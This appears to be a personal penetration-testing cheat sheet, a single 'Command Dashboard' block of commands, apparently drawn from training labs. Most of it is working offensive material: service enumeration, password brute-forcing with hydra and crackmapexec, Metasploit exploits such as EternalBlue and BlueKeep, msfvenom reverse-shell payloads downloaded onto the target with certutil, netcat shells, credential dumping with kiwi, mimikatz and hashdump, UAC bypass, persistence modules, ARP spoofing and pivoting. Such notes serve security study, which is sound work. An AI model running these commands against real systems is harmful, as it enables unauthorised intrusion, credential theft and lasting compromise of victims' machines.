---
dg-publish: true
---
# Command Dashboard

```bash
sudo nmap -sn ip/subnet
nmap ipaddress                # default scanning
nmap -Pn ipaddress            # resolve the ping problem
nmap -p445 --script smb-protocols (IPaddress)
nmap -p445 --script smb-security-mode (IPaddress)
nmap -p445 --script smb-enum-sessions (IPaddress)
nmap -p445 --script smb-enum-sessions --script-args smbusername=(username),smbpassword=(password) (IPaddress)
nmap -p445 --script smb-enum-shares (IPaddress)
nmap -p445 --script smb-enum-users --script-args smbusername=(username),smbpassword=(password) (IPaddress)
nmap -p445 --script smb-enum-domains --script-args smbusername=(username),smbpassword=(password) (IPaddress)
smbmap -u guest -p "" -d . -H (IPaddress)
smbmap -u administrator -p smbserver_771 -d . -H (IPaddress)
smbmap -H (IPaddress) -u (username) -p ('password') -L
smbmap -H (IPaddress) -u (username) -p ('') -r 'C$'
smbmap -H (IPaddress) -u (username) -p ('password') --download 'C$\filename'
nmap -sS (IPaddress)
nmap -sU --top-ports 25 (IPaddress)
Find workgroup name
nmap -sV -p445 (IPaddress)
Find exact version & NetBIOS computer name
nmap (IPaddress) -p 445 --script smb-os-discovery
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS (IPaddress)
run
exploit
smbclient -L (IPaddress) -N
rpcclient -U "" -N (IPaddress)
enum4linux -o (IPaddress)
use auxiliary/scanner/smb/smb2
set RHOST (IPaddress)
nmap --script smb-enum-users.nse -p445 (IPaddress)
use auxiliary/scanner/smb/smb_enumusers
enum4linux -U (IPaddress)
nmap (IPaddress) --script smb-enum-shares -p445
use auxiliary/scanner/smb/smb_enumshares
enum4linux -S (IPaddress)
Find all domain groups
enum4linux -G (IPaddress)
enum4linux -i (IPaddress)
use auxiliary/scanner/smb/smb_login
set PASS_FILE (location of the file)
set SMBUser (username)
hydra -l admin -P (location) (IPaddress) smb
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass (password)
Find version of FTP
nmap -p21 -sV -O 192.67.22.3
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.67.22.3 -t 4 ftp
Find whether anonymous login is allowed
nmap (IPaddress) -p21 --script ftp-anon
MySQL Basics
MySQL version
nmap -p3306 -sV (IPaddress)
mysql -h (IPaddress) -u (username)
use (Database name)
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME (username)
set PASSWORD ""
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST location
set VERBOSE false
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST (location)
mysql -u (username) -h (IPaddress)
use auxiliary/scanner/mysql/mysql_hashdump
nmap --script mysql-empty-password -p3306 (IPaddress)
nmap --script mysql-info -p3306 (IPaddress)
nmap --script mysql-users --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
nmap --script mysql-databases --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
nmap --script mysql-variables --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
nmap --script mysql-audit --script-args mysql-audit.username='root',mysql-audit.password="",mysql-audit.filename='location' -p3306 (IPaddress)
nmap --script mysql-dump-hashes --script-args mysqluser='root',mysqlpass="" -p3306 (IPaddress)
use auxiliary/scanner/mysql/mysql_login
set PASS_FILE (file location)
set STOP_ON_SUCCESS true
hydra -l (username) -P (file location) (IPaddress) mysql
nmap --script ms-sql-info -p 1433 (IPaddress)
nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 (IPaddress)
nmap -p 1433 --script ms-sql-brute --script-args userdb=(location) (IPaddress)
nmap -p1433 --script ms-sql-empty-password (IPaddress)
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 10.0.17.27
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.0.0.242
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass qwertyuiop
meterpreter >
nmap -sV -p445 --script=smb-vuln-ms17-010 (IPaddress)
chmod +x shell_prep.sh
set the LHOST and LPORT
use exploit/windows/smb/ms17_010_eternalblue
hydra -L (user file location) -P (password file location) rdp://(IPaddress) -s (port number)
xfreerdp /u:username /p:(password) /v:(ipaddress)/(portnumber)
nmap -p 3389 (IPaddress)
use scanner/rdp/cve_2019_0708_bluekeep
use exploit/windows/rdp/cve_2019_0708_rce
set RHOSTS (ipaddress)
set target (number)
crackmapexec winrm (IPaddress) -u (username file path) -p (password file path)
crackmapexec winrm (IPaddress) -u (username) -p (password) -x "(commands)"
evil-winrm.rb -u (username) -p '(password)' -i (password)
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.0.0.173
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
use exploit/windows/winrm/winrm_script_exec
set FORCE_VBS true
systeminfo
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.1.3
set LPORT 4444
meterpreter > migrate -N lsass.exe
meterpreter > shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f exe > payload.exe
python -m SimpleHTTPServer 80
certutil -urlcache -f http://10.10.12.2/payload.exe payload.exe
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.12.2
set LPORT 1234
meterpreter > load kiwi
FTP is a protocol that uses TCP port 21 and facilitates file sharing between a server and client(s). It is frequently used for transferring files to/from a web server's directory. FTP authentication requires a username and password combination, so we can brute-force it to identify legitimate credentials.
SSH is a remote administration protocol offering encryption, the successor to Telnet. Uses TCP port 22 by default. Authentication can be configured in two ways:
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.245.211.3
use auxiliary/scanner/ssh/ssh_login
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE true
cat /usr/local/share/copy.sh
chmod 644 /tmp/message
Tshark is a command line tool created by the Wireshark team, sharing the same parsing engine as Wireshark, but with the "from command line" advantage — ideal for batch analysis, offline processing, and routine automation of traffic analysis tasks.
tshark -v
tshark -D
tshark -i eth0
tshark -r HTTP_traffic.pcap
tshark -r HTTP_traffic.pcap | wc -l
tshark -r HTTP_traffic.pcap -z io,phs -q
tshark -Y 'http' -r HTTP_traffic.pcap
tshark -r HTTP_traffic.pcap -Y 'ip.src==192.168.252.128 && ip.dst==52.32.74.91'
tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET'
tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri
tshark -r HTTP_traffic.pcap -Y "http contains password"
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
Meterpreter Payload
Nmap is a free and open-source network scanner used to discover hosts on a network and scan targets for open ports. It can also enumerate services running on open ports and the operating system running on the target. We can output Nmap scan results in a format importable into MSF for vulnerability detection and exploitation.
FTP Enumeration
FTP uses TCP port 21 and facilitates file sharing between a server and clients. We can use multiple auxiliary modules to enumerate information and perform brute-force attacks. FTP authentication uses a username/password combination, though improperly configured servers can sometimes be accessed anonymously.
Service version of FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.51.147.3
use auxiliary/scanner/ftp/anonymous
MySQL Enumeration
MySQL is an open-source relational database management system based on SQL. Uses TCP port 3306 by default. We can use auxiliary modules to enumerate MySQL version, brute-force passwords, execute SQL queries, and more.
SSH Enumeration
SSH is a remote administration protocol offering encryption; the successor to Telnet. Uses TCP port 22 by default. We can enumerate the SSH version and perform brute-force attacks to identify passwords.
searchsploit "" (used to search for exploits)
Msfvenom is a command line utility used to generate and encode MSF payloads for various operating systems and web servers. It's a combination of `msfpayload` and `msfencode`. We can generate a malicious meterpreter payload that connects back to our payload handler once executed on the target.
msfvenom --list  # list all payloads
set LHOST 10.10.10.5
msfconsole -r handler.rc
service postgresql start
workspace -a HFS
db_nmap -sS -sV -O (ipaddress)
use exploit/windows/http/rejetto_hfs_exec
set LPORT (attacker port)
set LHOST (attacker ip)
workspace -a Eternalblue
db_nmap -sS -sV -O (IPaddress)
use auxiliary/scanner/smb/smb_ms17_010
service postgresql
workspace -a winrm
set USER_FILE (location)
set PASS_FILE (location)
set USERNAME (uname)
set PASSWORD (password)
set CMD (command)
workspace -a apache
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set SHELL cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(attacker IP) LPORT=(portnumber) -f exe > meterpreter.exe
sudo python -m SimpleHTTPServer 80
certutil -urlcache -f http://(IPaddress)/meterpreter.exe meterpreter.exe
set LHOST (IPaddress)
set LPORT (portnumber)
FTP uses TCP port 21. **vsftpd** is an FTP server for Unix-like systems including Linux, and is the default FTP server for Ubuntu, CentOS, and Fedora. **vsftpd V2.3.4** is vulnerable to a command execution vulnerability facilitated by a malicious backdoor added to the vsftpd download archive through a supply chain attack.
use exploit/unix/ftp/vsftpd_234_backdoor
use post/multi/manage/shell_to_meterpreter
set SESSION 1
use exploit/linux/samba/is_known_pipename
use auxiliary/scanner/ssh/libssh_auth_bypass
set SPAWN_PTY true
use exploit/linux/smtp/haraka
set RHOST (ipaddress)
set LHOST (ipaddress)
set email_to root@attackdefense.test
set SRVPORT 9898
set payload linux/x64/meterpreter_reverse_http
workspace -a windows_post
db_nmap -sV (IPaddress)
use post/windows/manage/migrate   # migrate to a session
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
set session 1
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use exploit/windows/local/bypassuac_injection
set session (session number)
set RHOSTS 10.0.28.7
load incognito
set SMBUser (user name)
set SMBPass (paste the hash value)
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
use post/windows/manage/enable_rdp
set SESSION (session number)
sessions 1
xfreerdp /u:administrator /p:(password) /v:(IPaddress)
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.27.99
set PORTS 1-100
meterpreter > background
sessions -i 1
portfwd add -l 1234 -p 80 -r 10.0.27.99
portfwd list
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set USERNAME (name)
sessions -u 1
use exploit/unix/local/chkrootkit
set SESSION 2
set CHKROOTKIT /bin/chkrootkit
sessions -u 3
use post/linux/manage/sshkey_persistence
set SESSION 4 (session num)
set CREATESSHFOLDER true
chmod 0400 ssh_key
ssh -i ssh_key root@192.182.80.3
nmap -sV -O (IPaddress)
nmap -sV --script=banner (IPaddress)
nc (IPaddress) (port number)
nc -nv 10.4.20.244 80
certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe
nc -nvlp 1234
nc -nv 10.4.21.221 1234
nc -nvlp 1234 -e /bin/bash
cat /etc/hosts
nmap -sV 10.0.22.85
nmap -T4 -Pn -sC -sV -p 1-10000 10.0.22.85
nmap -sV -sC -p 445 10.0.22.85
set RHOSTS 10.0.22.85
ftp 10.0.22.85 21
FTP Brute Force
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.22.85 ftp
ftp 10.0.28.97 21
Python 2
Python 3
python3 -m http.server 80
certutil -urlcache -f http://mimikatz.exe mimikatz.exe
wget http://192.196.45.2/test.txt
python -c 'import pty; pty.spawn("/bin/bash")'
ipconfig
netstat -aon     # services running
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
john --format=NT hashes.txt
hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.229.31.3
use post/linux/gather/hashdump
use auxiliary/analyze/crack_linux
set SHA512 true
nmap 10.0.23.180
Nmap scan report for 10.0.23.180
Nmap done: 1 IP address (1 host up) scanned in 2.68 seconds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
set RHOSTS 10.0.23.180
meterpreter > ipconfig
meterpreter > run autoroute -s 10.0.23.0/20
```
